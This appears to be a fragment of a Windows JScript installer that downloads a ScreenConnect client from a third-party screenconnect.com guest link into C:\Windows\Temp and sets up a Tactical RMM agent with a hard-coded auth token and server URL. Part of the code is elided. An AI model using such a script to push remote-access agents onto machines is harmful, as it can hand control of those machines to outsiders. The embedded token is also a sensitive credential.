(function() {
    // ==================== YOUR CONFIGURATION ====================
    var AUTH_TOKEN = "ef391249dac727ab6b5352dad3efd2543363db896b327e5e1252b38380d6146d";
    var SERVER_URL = "https://api.mariner.help";
    var CLIENT_ID = "1";
    var SITE_ID = "1";
    var AGENT_TYPE = "Workspace";
    
    var DOWNLOAD_URL = "https://saivausa.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest";
    var SAVE_PATH = "C:\\Windows\\Temp\\ScreenConnect.ClientSetup.exe";
    ...
    // STOP DUPLICATE INSTALL
if (fso.FileExists(AGENT_PATH) || fso.FileExists(AGENT_PATH_ALT)) {
    writeLog("Tactical RMM is already installed. Skipping installation.");
